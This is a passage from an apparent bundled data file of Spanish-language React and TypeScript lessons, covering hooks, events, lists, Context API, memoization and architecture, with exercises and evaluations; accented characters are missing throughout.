## 3. Estado con TypeScript
TS suele inferir el tipo del estado a partir del valor inicial. Pero si es complejo (ej: un array de objetos), lo definimos as:

\`\`\`tsx
const [usuarios, setUsuarios] = useState<User[]>([]);
\`\`\`

## 4. Reglas de los Hooks
1.  **Solo en el nivel superior:** No puedes llamar a \`useState\` dentro de \`if\`, \`for\` o funciones anidadas.
2.  **Solo en componentes de React:** O en Hooks personalizados.

## 5. Error Comn: Mutacin Directa
**NUNCA** hagas esto: \`cuenta = cuenta + 1\`. 
React no se enterar del cambio y la pantalla no se actualizar. Usa siempre la funcin set (\`setCuenta\`).

---

## Mini Ejercicio
Crea un componente con un estado llamado \`isVisible\` (booleano). Agrega un botn que cambie ese estado de \`true\` a \`false\` (toggle) al hacer click.
`,completed:!1},{id:"react-junior-eventos",title:"Eventos en React",level:"junior",content:`# Leccin 7: Eventos en React

Manejar interacciones del usuario en React es muy similar al DOM estndar, pero con sintaxis CamelCase y pasando funciones.

## 1. Eventos comunes

### Click
\`\`\`tsx
const handleClick = () => {
  alert("Hola!");
};

<button onClick={handleClick}>Saludar</button>
\`\`\`

### Cambios en Inputs (onChange)
Es fundamental para capturar lo que el usuario escribe.

\`\`\`tsx
const [texto, setTexto] = useState("");

const manejarCambio = (e: React.ChangeEvent<HTMLInputElement>) => {
  setTexto(e.target.value);
};

<input type="text" onChange={manejarCambio} />
\`\`\`

## 2. El objeto Evento (\`e\`)
En React, el evento es un "SyntheticEvent", un envoltorio que hace que los eventos funcionen igual en todos los navegadores.
*   **TypeScript Tip:** Para un input, el tipo es \`React.ChangeEvent<HTMLInputElement>\`.

## 3. Pasar argumentos a un evento
Si necesitas pasar un dato extra a la funcin del evento, debes usar una funcin annima.

\`\`\`tsx
//  Error: Se ejecuta al renderizar
<button onClick={eliminarUsuario(id)}>Eliminar</button>

//  Correcto: Se ejecuta solo al hacer click
<button onClick={() => eliminarUsuario(id)}>Eliminar</button>
\`\`\`

## 4. Prevenir comportamiento por defecto
til en formularios.

\`\`\`tsx
const handleSubmit = (e: React.FormEvent) => {
  e.preventDefault(); // Evita que la pgina se recargue
  console.log("Enviando...");
};
\`\`\`

---

## Mini Ejercicio
Crea un input de texto y una etiqueta \`p\`. Haz que el texto del prrafo se actualice en tiempo real con lo que el usuario escribe en el input.
`,completed:!1},{id:"react-junior-renderizado-condicional",title:"Renderizado Condicional",level:"junior",content:`# Leccin 8: Renderizado Condicional

El renderizado condicional permite mostrar u ocultar elementos basndonos en la lgica de nuestra aplicacin.

## 1. Usando el operador Ternario \`? :\`
Ideal para elegir entre dos opciones (A o B).

\`\`\`tsx
function Mensaje({ isLoggedIn }: { isLoggedIn: boolean }) {
  return (
    <div>
      {isLoggedIn ? <h1>Bienvenido de nuevo</h1> : <h1>Por favor inicia sesin</h1>}
    </div>
  );
}
\`\`\`

## 2. Usando el Cortocircuito \`&&\`
Ideal para mostrar algo **solo si una condicin es verdadera**. Si es falsa, no muestra nada.

\`\`\`tsx
function Notificaciones({ mensajesRecibidos }: { mensajesRecibidos: number }) {
  return (
    <div>
      <h2>Dashboard</h2>
      {mensajesRecibidos > 0 && (
        <span className="badge">Tienes mensajes nuevos</span>
      )}
    </div>
  );
}
\`\`\`

## 3. Retorno Temprano (Early Return)
Si un componente no debe renderizar absolutamente nada bajo cierta condicin, podemos retornar \`null\`.

\`\`\`tsx
function Modal({ isOpened }: { isOpened: boolean }) {
  if (!isOpened) return null; // No sigue procesando

  return <div className="modal">Estoy abierto!</div>;
}
\`\`\`

## 4. Error Comn: Ceros en la pantalla
Ten cuidado con el \`&&\` y los nmeros. \`0 && <Component />\` renderizar el nmero \`0\` en pantalla porque en JS el 0 es falso pero es un valor imprimible. 
**Solucin:** Asegrate de que la condicin sea un booleano real: \`mensajes.length > 0 && ...\`.

---

## Mini Ejercicio
Crea un componente que reciba una prop \`error\` (string). Si \`error\` tiene contenido, muestra un div rojo con el texto; si no, no muestres nada.
`,completed:!1},{id:"react-junior-listas-keys",title:"Listas y Keys",level:"junior",content:`# Leccin 9: Listas y Keys

Para mostrar mltiples elementos similares (como una lista de productos o mensajes), usamos el mtodo \`.map()\` de JavaScript.

## 1. Mapeando una lista
\`\`\`tsx
const frutas = ["Manzana", "Pera", "Naranja"];

function ListaFrutas() {
  return (
    <ul>
      {frutas.map((fruta) => (
        <li key={fruta}>{fruta}</li>
      ))}
    </ul>
  );
}
\`\`\`

## 2. El atributo \`key\`
Cada elemento en una lista generada por \`map\` **debe** tener una prop \`key\` nica.
*   **Para qu sirve?** Ayuda a React a identificar qu elementos han cambiado, se han agregado o eliminado. Sin ella, React tiene que volver a dibujar toda la lista, lo cual es ineficiente.
*   **Qu usar?** Idealmente un ID nico de tu base de datos (\`user.id\`).

## 3. Error Comn: Usar el ndice como key
\`map((item, index) => <li key={index}>...</li>)\` es una mala prctica si la lista puede cambiar de orden o eliminarse elementos, ya que el ndice no identifica permanentemente al dato. salo solo como ltimo recurso.

## 4. Renderizando Componentes
Puedes mapear una lista a componentes personalizados pasando los datos como props.

\`\`\`tsx
{usuarios.map((u) => (
  <UserCard key={u.id} user={u} />
))}
\`\`\`

---

## Mini Ejercicio
Tienes un array de objetos: \`[{id: 1, name: 'Tarea 1'}, {id: 2, name: 'Tarea 2'}]\`. Escribe el cdigo necesario para renderizar esta lista dentro de un \`div\`.
`,completed:!1},{id:"react-junior-estructura-proyecto",title:"Estructura de un Proyecto React",level:"junior",content:`# Leccin 10: Estructura de un Proyecto React

A medida que tu aplicacin crece, saber dnde poner cada archivo es vital para no perder el control.

## 1. La carpeta \`src\`
Es donde vive todo el cdigo fuente.

\`\`\`
src/
  assets/         (Imgenes, fuentes, iconos)
  components/     (Tus piezas de LEGO: Button, Nav, Card)
  hooks/          (Lgica personalizada)
  pages/          (Componentes grandes que representan una ruta)
  services/       (Llamadas a APIs)
  App.tsx         (El componente principal de entrada)
  main.tsx        (Donde React se conecta con el HTML del navegador)
\`\`\`

## 2. El punto de entrada (\`main.tsx\`)
Aqu sucede la magia inicial:
\`\`\`tsx
ReactDOM.createRoot(document.getElementById('root')!).render(
  <React.StrictMode>
    <App />
  </React.StrictMode>
);
\`\`\`
\`StrictMode\` es un componente especial que te ayuda a detectar problemas en tu cdigo durante el desarrollo.

## 3. Nombrado de Archivos
*   Componentes: \`PascalCase.tsx\` (ej: \`UserCard.tsx\`).
*   Scripts/Lgica: \`camelCase.ts\` (ej: \`analytics.ts\`).

## 4. Estilos (CSS)
Puedes usar archivos \`.css\` normales e importarlos en tu componente: \`import './Button.css'\`. El alcance de este CSS ser global, por lo que es recomendable usar metodologas como **BEM** o pasarse a **CSS Modules** o **Tailwind** ms adelante.

---

## Mini Ejercicio
Si tuvieras que crear un componente que solo se usa dentro de \`NavBar.tsx\`, donde lo guardaras segn la estructura sugerida?
`,completed:!1},{id:"react-junior-buenas-practicas",title:"Buenas Prcticas Bsicas",level:"junior",content:`# Leccin 11: Buenas Prcticas Bsicas

Escribir cdigo que funcione es fcil; escribir cdigo que otro humano pueda entender es el verdadero reto.

## 1. Componentes Pequeos y Enfocados
Si un componente tiene ms de 200 lneas, probablemente est haciendo demasiadas cosas.
**Regla:** Un componente debe tener una nica responsabilidad. Si tu \`Header.tsx\` tambin maneja la lgica de autenticacin y el carrito, sepralo.

## 2. No mutar el estado
NUNCA modifiques un objeto o array del estado directamente.
\`\`\`tsx
//  Incorrecto
const agregar = () => {
  lista.push("nuevo");
  setLista(lista);
};

//  Correcto (crear una copia)
const agregar = () => {
  setLista([...lista, "nuevo"]);
};
\`\`\`

## 3. Desestructuracin de Props
Hace el cdigo ms limpio y te permite ver de un vistazo qu datos necesita un componente.

## 4. Evitar "Props Drilling" profundo
Pasar props a travs de 5 niveles de componentes para que lleguen al ltimo hijo es frustrante. En niveles avanzados aprenderemos sobre **Context API** o **Redux** para solucionar esto. Por ahora, intenta mantener tus jerarquas simples.

## 5. Nombres Descriptivos
Usa prefijos claros:
*   \`manejarClick\` o \`handleClick\` para funciones de eventos.
*   \`esVisible\` o \`estaCargando\` para booleanos.

---

## Ejercicio Final del Mdulo
Crea una mini-aplicacin de "Contador de Pasos":
1.  Un estado \`pasos\` inicializado en 0.
2.  Un botn para aumentar.
3.  Un botn para reiniciar a 0.
4.  Si los pasos son mayores a 100, muestra un mensaje: "Excelente caminata!".
5.  Usa TypeScript para tipar todo.

Felicidades por completar el nivel Junior de React! 
`,completed:!1},{id:"ejercicios-junior",title:"Ejercicios Prcticos: React Junior",level:"junior",content:`# Ejercicios Prcticos: React Junior

Pon a prueba tus habilidades construyendo mini-aplicaciones reales. Recuerda usar **TypeScript** para todas tus soluciones.

---

## 1. El Contador de Productividad
**Objetivo:** Manejar estado simple y eventos.

**Consigna:**
Crea un componente llamado \`TaskTimer\`.
*   Tendr un estado \`segundos\` que inicia en 0.
*   Un botn "Sumar 10s" y otro "Restar 10s".
*   Si los segundos llegan a 60, muestra un mensaje: "Minuto completado!".
*   Impide que los segundos sean menores a 0.

**Resultado Esperado:** Una interfaz donde el usuario pueda ajustar el tiempo de una tarea con lmites lgicos.

---

## 2. Formulario de Suscripcin
**Objetivo:** Formularios controlados y validacin bsica.

**Consigna:**
Crea un componente \`NewsletterForm\`.
*   Un input de tipo texto para el \`nombre\`.
*   Un input de tipo email para el \`correo\`.
*   Un botn de "Suscribirme".
*   Al hacer click en enviar, muestra un mensaje de xito: "Gracias [nombre], te enviaremos novedades a [correo]".
*   **Bonus:** El botn debe estar deshabilitado si alguno de los campos est vaco.

**Resultado Esperado:** Un formulario que captura datos del usuario y reacciona a su contenido.

---

## 3. Mi Lista de Compras
**Objetivo:** Renderizado de listas y keys.

**Consigna:**
Crea un componente \`ShoppingList\`.
*   Define un array inicial de objetos: \`[{ id: 1, name: 'Pan', bought: false }, ...]\`.
*   Renderiza la lista usando \`.map()\`.
*   Cada item debe mostrar su nombre.
*   **Interaccin:** Agrega un botn "Comprar" al lado de cada item. Al hacer click, el nombre de ese item debe tacharse (usando estilos condicionales).

**Resultado Esperado:** Una lista interactiva donde puedas marcar elementos como procesados.

---

## 4. Componente de Alerta Reutilizable
**Objetivo:** Props y desestructuracin.

**Consigna:**
Crea un componente llamado \`Alert\`.
*   Debe recibir tres props: \`type\` ('success' | 'warning' | 'error'), \`message\` (string) y \`onClose\` (una funcin).
*   El color de fondo debe cambiar segn el \`type\`.
*   Debe tener un botn "X" que ejecute la funcin \`onClose\` pasada por props.

**Resultado Esperado:** Un componente que puedas usar en cualquier parte de tu app pasando diferentes estilos y mensajes.

---

## 5. El Mini Gestor de Tareas (Final)
**Objetivo:** Integracin de estado, listas y formularios.

**Consigna:**
Crea una \`App\` de tareas donde el usuario pueda:
1.  Escribir una tarea en un input.
2.  Presionar "Agregar" y que se sume a una lista inferior.
3.  Poder eliminar una tarea haciendo click sobre ella.
*   Recuerda generar IDs nicos (puedes usar \`Date.now()\`).

**Resultado Esperado:** Una aplicacin funcional de To-Do que demuestre el flujo completo de datos en React.

---

A construir! 
`,completed:!1,isProject:!0},{id:"react-junior-evaluacion",title:"Evaluacin React Junior",level:"junior",content:`# Evaluacin Final: React Junior

Demuestra que dominas las bases: Componentes, Props, Estado y Listas.

## 1. Examen Terico
*   Cul es la diferencia principal entre una Prop y el Estado (State)?
*   Por qu no podemos modificar el estado directamente como \`estado = nuevoValor\`?
*   Para qu sirve la propiedad \`key\` cuando usamos \`.map()\`?

## 2. Desafo Prctico: Perfil de Usuario Dinmico
Crea un componente \`UserProfile\` que:
1. Reciba por props: \`username\`, \`email\` y \`avatarUrl\`.
2. Tenga un estado \`isFollowed\` (booleano) que inicie en \`false\`.
3. Un botn que al hacer click cambie el texto entre "Seguir" y "Siguiendo", cambiando tambin el color del botn.

## 3. Ejercicio de Listas: Gestor de Invitados
Tienes este array: \`['Ana', 'Pedro', 'Luis']\`.
1. Renderiza la lista.
2. Agrega un input para escribir un nuevo nombre.
3. Un botn "Agregar" que sume el nombre a la lista visual.

## 4. Criterios de Aprobacin
* [ ] Uso correcto de interfaces TypeScript para las Props.
* [ ] Implementacin exitosa de \`useState\`.
* [ ] Uso de \`.map()\` con \`key\` nica.
* [ ] El cdigo debe compilar sin errores de tipos.
`,completed:!1,isProject:!0},{id:"react-semi-senior-ciclo-renderizado",title:"El Ciclo de Vida y Renderizado",level:"semi-senior",content:`# Leccin 12: El Ciclo de Vida y Renderizado

Como desarrollador Semi-Senior, ya no basta con que el cdigo "funcione". Debes entender **cundo** y **por qu** React decide dibujar de nuevo.

## 1. Por qu renderiza React?
React dispara un renderizado solo en tres casos:
1.  **Cambio de Estado:** Cuando llamas a la funcin \`set\` de un \`useState\`.
2.  **Cambio de Props:** Cuando el componente padre se vuelve a renderizar.
3.  **Cambio de Contexto:** Cuando un valor en un Context cambia.

## 2. El Proceso: Render vs Commit
*   **Render phase:** React llama a tu funcin y calcula qu parte de la UI cambi (Virtual DOM). Es puro, sin efectos secundarios.
*   **Commit phase:** React aplica los cambios mnimos necesarios al DOM real.

## 3. Error Comn: Bucles Infinitos
Un error de principiante es modificar el estado directamente en el cuerpo de la funcin.

\`\`\`tsx
//  INCORRECTO: Bucle infinito
function MyComponent() {
  const [data, setData] = useState(0);
  setData(data + 1); // Dispara render -> ejecuta funcin -> dispara render...
  return <div>{data}</div>;
}
\`\`\`

## 4. Estabilidad de Referencia
En React, si creas un objeto o funcin dentro del componente, es una **nueva referencia** en cada renderizado. Esto puede romper optimizaciones o disparar efectos innecesarios.

\`\`\`tsx
//  Cuidado: Este objeto se crea de nuevo cada vez
const config = { api: 'xyz' };
\`\`\`

---

## Mini Ejercicio
Si un componente padre tiene un estado que cambia cada segundo, se vuelven a renderizar sus hijos si sus props no cambian? Investiga sobre "React.memo" brevemente.
`,completed:!1},{id:"react-semi-senior-use-effect-profundidad",title:"useEffect en Profundidad",level:"semi-senior",content:`# Leccin 13: useEffect en Profundidad

\`useEffect\` es el Hook ms incomprendido. No es un "evento de carga", es un mecanismo de **sincronizacin**.

## 1. La Anatoma del Efecto
\`\`\`tsx
useEffect(() => {
  // 1. Ejecucin del efecto
  return () => {
    // 2. Funcin de limpieza (Cleanup)
  };
}, [dependencias]); // 3. Array de dependencias
\`\`\`

## 2. Diferentes Comportamientos
*   **Sin array:** Se ejecuta en **todos** los renders (Poco comn).
*   **Array vaco \`[]\`:** Se ejecuta solo al **montar**.
*   **Con valores \`[prop, state]\`:** Se ejecuta solo cuando esos valores cambian.

## 3. La Funcin de Limpieza (Cleanup)
Es vital para evitar "Memory Leaks" o comportamientos extraos al destruir el componente.
\`\`\`tsx
useEffect(() => {
  const timer = setInterval(() => console.log('Ping'), 1000);

  return () => clearInterval(timer); //  Limpiamos antes de irnos
}, []);
\`\`\`

## 4. El "Efecto" de la falta de dependencias
**Regla de Oro:** Si usas una variable dentro de \`useEffect\`, **debe** estar en el array de dependencias. TypeScript (con ESLint) te lo recordar.

## 5. Caso Real: Peticin de API
\`\`\`tsx
useEffect(() => {
  let isMounted = true;
  
  fetchData().then(data => {
    if (isMounted) setResponse(data);
  });

  return () => { isMounted = false; };
}, [userId]);
\`\`\`

---

## Mini Ejercicio
Crea un efecto que escuche el evento \`resize\` del navegador y guarde el ancho de la ventana en un estado. No olvides remover el listener en el cleanup.
`,completed:!1},{id:"react-semi-senior-custom-hooks",title:"Custom Hooks (Extrayendo Lgica)",level:"semi-senior",content:`# Leccin 14: Custom Hooks (Extrayendo Lgica)

Un Custom Hook es una funcin de JavaScript cuyo nombre comienza con \`use\` y que puede llamar a otros Hooks. Permite reutilizar lgica de estado entre componentes sin repetir cdigo.

## 1. Cundo crear uno?
Cuando ves que el mismo \`useState\` y \`useEffect\` se repiten en dos o tres lugares diferentes.

## 2. Ejemplo: useFetch
Imagina que muchas pginas necesitan cargar datos.

\`\`\`tsx
// hooks/useFetch.ts
function useFetch<T>(url: string) {
  const [data, setData] = useState<T | null>(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    fetch(url)
      .then(res => res.json())
      .then(json => {
        setData(json);
        setLoading(false);
      });
  }, [url]);

  return { data, loading };
}

// Uso en componente
const { data, loading } = useFetch<User[]>('/api/users');
\`\`\`

## 3. Beneficios
1.  **Limpieza:** Los componentes se enfocan solo en la UI.
2.  **Testeabilidad:** Es ms fcil testear una funcin pura de lgica que un componente visual.
3.  **Encapsulacin:** Los componentes no necesitan saber *cmo* se cargan los datos, solo los piden.

---

## Mini Ejercicio
Refactoriza la lgica de un contador (incrementar, decrementar, reset) en un custom hook llamado \`useCounter\`.
`,completed:!1},{id:"react-semi-senior-context-api",title:"Comunicacin y Context API",level:"semi-senior",content:`# Leccin 15: Comunicacin y Context API

A medida que la aplicacin crece, pasar props de un padre a un hijo de forma excesiva (**Props Drilling**) se vuelve un problema de mantenimiento.

## 1. Elevacin de Estado (Lifting State Up)
Si dos componentes hermanos necesitan compartir el mismo dato, debes mover el estado al padre comn ms cercano.

## 2. Context API: El Estado Global "Ligero"
Context permite compartir valores por todo el rbol de componentes sin pasarlos manualmente por props en cada nivel.

\`\`\`tsx
// 1. Crear el Context
const UserContext = createContext<User | null>(null);

// 2. Proveer el valor
function App() {
  return (
    <UserContext.Provider value={currentUser}>
      <Nav />
      <Main />
    </UserContext.Provider>
  );
}

// 3. Consumir el valor (En cualquier hijo)
function Profile() {
  const user = useContext(UserContext);
  return <p>{user?.name}</p>;
}
\`\`\`

## 3. Cundo NO usar Context?
Context no es para todo. Si un valor cambia muy frecuentemente (ej: un input de texto), Context provocar que **todos** los componentes que lo consumen se vuelvan a renderizar, lo que puede causar lag.

## 4. Patrn: Provider con Hook Personalizado
Es profesional envolver el \`useContext\` en un custom hook para manejar errores si el componente est fuera del proveedor.

\`\`\`tsx
export function useUser() {
  const context = useContext(UserContext);
  if (!context) throw new Error("useUser debe usarse dentro de UserProvider");
  return context;
}
\`\`\`

---

## Mini Ejercicio
Crea un \`ThemeContext\` que permita cambiar entre 'light' y 'dark' en toda la aplicacin.
`,completed:!1},{id:"react-semi-senior-formularios-ss",title:"Manejo de Formularios Avanzado",level:"semi-senior",content:`# Leccin 16: Manejo de Formularios Avanzado

En el nivel Semi-Senior, dejas de usar mltiples \`useState\` para cada input de un formulario gigante.

## 1. El Objeto de Estado nico
Agrupamos los valores en un solo objeto para facilitar el manejo.

\`\`\`tsx
const [form, setForm] = useState({
  username: '',
  email: '',
  password: ''
});

const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
  const { name, value } = e.target;
  setForm({
    ...form,
    [name]: value // Usamos la llave dinmica
  });
};

<input name="username" value={form.username} onChange={handleChange} />
\`\`\`

## 2. Formularios Controlados vs No Controlados
*   **Controlados (Recomendado):** React tiene el control total. \`value\` viene del estado.
*   **No Controlados:** El DOM tiene el control. Usamos \`useRef\` para leer el valor solo cuando lo necesitamos (ej: envo). Es til para formularios muy simples o integraciones con libreras externas.

## 3. Manejo de Errores de Validacin
No confes solo en las validaciones de HTML5. Valida en el \`onSubmit\` o mediante efectos.

## 4. Libreras Populares
En proyectos reales grandes, solemos usar libreras como:
*   **React Hook Form:** Performance brutal y tipado excelente.
*   **Formik:** Basado en componentes, muy intuitivo (aunque menos popular hoy en da).

---

## Mini Ejercicio
Crea un formulario con 3 inputs y un botn. Al hacer click en el botn, muestra un \`console.table(form)\` con todos los datos.
`,completed:!1},{id:"react-semi-senior-patrones-organizacion",title:"Patrones y Estructura Organizativa",level:"semi-senior",content:`# Leccin 17: Patrones y Estructura Organizativa

Un desarrollador Semi-Senior organiza el cdigo para que sea fcil de navegar incluso meses despus.

## 1. El Patrn Contenedor-Presentacional (Bsico)
Separamos la lgica de la vista.
*   **Contenedor:** Se encarga del \`fetch\`, el estado y los clculos.
*   **Presentacional:** Es una funcin pura que recibe props y pinta la UI. No tiene \`useEffect\`.

## 2. Composicin de Componentes (\`children\`)
Evita pasar demasiadas props usando la prop especial \`children\`.

\`\`\`tsx
function Layout({ children }: { children: React.ReactNode }) {
  return (
    <div className="layout">
      <Nav />
      {children}
      <Footer />
    </div>
  );
}
\`\`\`

## 3. Estructura de Proyecto Profesional
\`\`\`
src/
  features/
    Auth/
      components/
      hooks/
      api.ts
      Auth.tsx (Main component)
  shared/
    components/ (Buttons, Inputs generales)
  context/
\`\`\`

## 4. Error Comn: Abuso de Abstraccin
No crees un componente genrico para TODO si solo lo vas a usar en un lugar. La duplicacin prematura de cdigo es peor que la duplicacin puntual. "Clean code" no significa cdigo corto, significa cdigo legible.

---

## Desafo Prctico Semi-Senior
Refactoriza una pequea aplicacin que use Props Drilling profundo (al menos 3 niveles) para que use un Context API y un Custom Hook para consumir los datos de forma segura.

---

Excelente progreso! Ahora entiendes no solo cmo usar React, sino cmo construir arquitecturas que escalan. 
`,completed:!1},{id:"react-semi-senior-evaluacion",title:"Evaluacin React Semi-Senior",level:"semi-senior",content:`# Evaluacin Final: React Semi-Senior

Enfocada en efectos secundarios, custom hooks y gestin de datos profesional.

## 1. Examen Terico
*   Explica qu sucede si omites el array de dependencias en un \`useEffect\`.
*   Cundo es preferible usar \`useReducer\` en lugar de mltiples \`useState\`?
*   Qu es el "Prop Drilling" y qu alternativas ofrece React para evitarlo?

## 2. Desafo Prctico: El Buscador de Usuarios
Crea un Custom Hook llamado \`useUsersSearch\` que:
1. Reciba una \`query\` (string).
2. Use un \`useEffect\` para filtrar una lista esttica de usuarios cada vez que la \`query\` cambie.
3. Devuelva \`{ filteredUsers, loading }\`. (Simula el loading con un \`setTimeout\` de 500ms).

## 3. Manejo de Formularios: Registro Completo
Crea un formulario con 4 campos (Nombre, Email, Password, Confirm Password).
1. Implementa una validacin: el Password debe tener al menos 6 caracteres y coincidir con el campo de confirmacin.
2. Muestra los errores en tiempo real debajo de cada input.
3. El botn de envo debe estar deshabilitado hasta que todo sea vlido.

## 4. Criterios de Aprobacin
* [ ] Correcta separacin de lgica en Custom Hooks.
* [ ] Uso eficiente de \`useEffect\` con limpieza (cleanup) si es necesario.
* [ ] Manejo de mltiples campos en un solo objeto de estado.
* [ ] Tipado estricto de eventos y estados complejos.
`,completed:!1,isProject:!0},{id:"react-senior-reconciliacion",title:"Reconciliacin y el Algoritmo de Diferenciacin (Diffing)",level:"senior",content:`# Leccin 18: Reconciliacin y el Algoritmo de Diferenciacin (Diffing)

A nivel Senior, no solo sabes que React es rpido; sabes **exactamente** cmo decide qu pxeles cambiar.

## 1. El Algoritmo de Diffing
React asume dos cosas para ser eficiente (O(n)):
1.  Dos elementos de diferentes tipos producirn rboles diferentes.
2.  El desarrollador puede indicar qu elementos son estables entre renders usando la prop \`key\`.

## 2. Comparacin de Elementos
*   **Diferente Tipo:** Si cambias de \`<div>\` a \`<span>\`, React destruye todo el rbol viejo y construye uno nuevo desde cero. Se pierde todo el estado de los hijos.
*   **Mismo Tipo:** React solo actualiza los atributos que cambiaron (ej: \`className\` o \`title\`) y mantiene la instancia del componente y su estado.

## 3. Por qu las keys son vitales?
Sin keys, si insertas un elemento al principio de una lista, React pensar que todos los elementos cambiaron. Con keys, React simplemente los reordena.

## 4. Pregunta de Entrevista Senior
**P:** "Qu sucede si uso \`Math.random()\` como key?"
**R:** En cada render, la key ser diferente. React pensar que el componente es completamente nuevo, lo destruir y lo volver a montar, perdiendo el estado y destruyendo la performance.

## 5. El Fiber Architecture
Desde React 16, el motor se llama **Fiber**. Su gran avance es la capacidad de **pausar, abortar o reutilizar** el trabajo de renderizado. Esto permite que las actualizaciones de alta prioridad (como escribir en un input) no se bloqueen por renderizados pesados.

---

## Desafo Tcnico
Investiga qu es el "Hydration Error" en aplicaciones que usan SSR (Server-Side Rendering) y cmo el algoritmo de reconciliacin maneja la diferencia entre el HTML del servidor y el del cliente.
`,completed:!1},{id:"react-senior-memoization",title:"Estrategias de Memoization",level:"senior",content:`# Leccin 19: Estrategias de Memoization

La optimizacin prematura es la raz de todos los males, pero la falta de optimizacin en aplicaciones grandes es un suicidio tcnico.

## 1. React.memo
Evita que un componente se re-renderice si sus props no han cambiado (comparacin superficial).

\`\`\`tsx
const ExpensiveComponent = React.memo(({ data }) => {
  return <div>{/* Mucho clculo aqu */}</div>;
});
\`\`\`

## 2. useMemo
Memoriza el **resultado** de un clculo costoso.
\`\`\`tsx
const filteredData = useMemo(() => {
  return bigData.filter(item => item.active);
}, [bigData]); // Solo se recalcula si bigData cambia
\`\`\`

## 3. useCallback
Memoriza una **instancia de funcin**. Evita romper el \`React.memo\` de los hijos que reciben funciones como props.

\`\`\`tsx
const handleClick = useCallback(() => {
  console.log("Click!");
}, []); // La referencia de la funcin es la misma en cada render
\`\`\`

## 4. El Costo de la Memoizacin
No memoices todo. \`useMemo\` y \`useCallback\` tienen un costo de memoria y procesamiento (comparar el array de dependencias). salos solo cuando:
1.  El clculo es realmente pesado.
2.  La estabilidad de la referencia es necesaria para evitar re-renders en cadena.

## 5. Pregunta de Entrevista
**P:** "Por qu \`[ ] === [ ]\` es falso y cmo afecta esto a las dependencias de un useEffect?"
**R:** Por la equidad referencial de JS. Si pasas un array literal como prop, React pensar que es nuevo siempre. \`useMemo\` ayuda a mantener esa referencia estable.

---

## Desafo
Crea una lista de 1000 elementos y usa el Profiler de React DevTools para medir la diferencia de tiempo de renderizado con y sin \`React.memo\`.
`,completed:!1},{id:"react-senior-performance",title:"Performance y Patrones Avanzados",level:"senior",content:`# Leccin 20: Performance y Patrones Avanzados

Optimizar React es a menudo un juego de "empujar" el estado hacia abajo o usar tcnicas de composicin.

## 1. Composicin vs Props (Slot Pattern)
En lugar de pasar props a travs de muchos niveles, pasa componentes ya renderizados.

\`\`\`tsx
//  Props Drilling
<Parent data={data}><Child data={data} /></Parent>

//  Composition: Parent no sabe qu renderiza, solo dnde
<Parent>
  <Child data={data} />
</Parent>
\`\`\`

## 2. Windowing (Virtualizacin)
Si tienes 10,000 elementos, no renderices 10,000 nodos DOM. Usa libreras como \`react-window\` para renderizar solo los que son visibles en el viewport.

## 3. Lazy Loading & Code Splitting
Divide tu aplicacin en trozos ms pequeos para mejorar la carga inicial (LCP).

\`\`\`tsx
const AdminPanel = React.lazy(() => import('./AdminPanel'));

function App() {
  return (
    <Suspense fallback={<Loading />}>
      <AdminPanel />
    </Suspense>
  );
}
\`\`\`

## 4. Concurrent Rendering (useTransition)
Permite marcar actualizaciones como "no urgentes". til para filtrados pesados mientras el usuario escribe.

\`\`\`tsx
const [isPending, startTransition] = useTransition();

const handleFilter = (e) => {
  startTransition(() => {
    setFilteredList(hugeList.filter(...));
  });
};
\`\`\`

## 5. Errores Crticos reales
**Caso:** Un desarrollador puso un \`Context.Provider\` en el nivel de \`App\` que contena el \`text\` de un search bar.
**Consecuencia:** Cada letra escrita haca que TODA la aplicacin (incluyendo el pesado Dashboard) se re-renderizara.
**Solucin:** Mover ese estado a un Context ms pequeo o usar una librera de estado atmico como **Zustand**.

---

## Desafo
Implementa una bsqueda con \`useDeferredValue\` y explica por qu mejora la fluidez de la interfaz en comparacin con un estado normal.
`,completed:!1},{id:"react-senior-arquitectura-senior",title:"Arquitectura de Componentes y Diseo de Sistemas",level:"senior",content:`# Leccin 21: Arquitectura de Componentes y Diseo de Sistemas

Escribir componentes es fcil; disear un **Sistema de Componentes** que sobreviva 3 aos es difcil.

## 1. Compound Components (Componentes Compuestos)
Un patrn para componentes que necesitan compartir un estado interno (ej: Tabs, Selects).

\`\`\`tsx
<Tabs defaultValue="home">
  <Tabs.List>
    <Tabs.Trigger value="home">Home</Tabs.Trigger>
  </Tabs.List>
  <Tabs.Content value="home">...</Tabs.Content>
</Tabs>
\`\`\`
Este patrn evita el "Props Drilling" y hace que la API del componente sea muy declarativa.

## 2. Headless UI
El concepto de separar la **lgica y accesibilidad** de los **estilos**. Libreras como \`Radix UI\` o \`React Aria\` te dan la lgica, t pones la UI. Esto es clave en Design Systems maduros.

## 3. Arquitectura de Carpetas: Feature-Based
En aplicaciones grandes, dejar de organizar por "tipo de archivo" (components, hooks) y organizar por **dominios de negocio** (Auth, Billing, Inventory).

## 4. Inversin de Control
En lugar de que tu componente tome todas las decisiones, deja que el usuario del componente pase la lgica necesaria.

\`\`\`tsx
//  Rgido
<Table data={data} showPagination />

//  Flexible (Inversin de control)
<Table 
  data={data} 
  renderFooter={(meta) => <CustomPagination {...meta} />} 
/>
\`\`\`

## 5. Pregunta Senior
**P:** "Cmo manejas la versin de un componente que necesita un cambio que rompe la compatibilidad (breaking change) en un monorepo?"
**R:** Estrategias de deprecacin, creacin de \`V2\` y migracin progresiva. Un arquitecto senior nunca rompe la produccin del equipo de un da para otro.

---

## Desafo
Disea la API de un componente \`Modal\` usando el patrn de Compound Components. Debe incluir \`Trigger\`, \`Overlay\`, \`Content\` y \`Close\`.
`,completed:!1},{id:"react-senior-estado-avanzado",title:"Estado Avanzado y State Machines",level:"senior",content:`# Leccin 22: Estado Avanzado y State Machines

Cuando los booleanos (\`isLoading\`, \`isError\`, \`isSuccess\`) ya no son suficientes para manejar la complejidad.

## 1. El Problema de los Booleanos "Imposibles"
\`\`\`tsx
const [loading, setLoading] = useState(true);
const [error, setError] = useState(false);
const [data, setData] = useState(null);
\`\`\`
Qu pasa si \`loading\` es true pero \`error\` tambin es true? Es un estado inconsistente.

## 2. Reducers (useReducer)
Ideal cuando la lgica de un estado depende de su estado anterior o cuando tienes mltiples estados relacionados.

\`\`\`tsx
const [state, dispatch] = useReducer(reducer, initialState);
\`\`\`

## 3. Finite State Machines (FSM)
Llevar el \`useReducer\` al siguiente nivel. Definir estados finitos y transiciones vlidas. Libreras como **XState** son el estndar para flujos de trabajo muy complejos.

## 4. Server State vs Client State
No mezcles datos de la API con el estado de la UI (ej: si un dropdown est abierto).
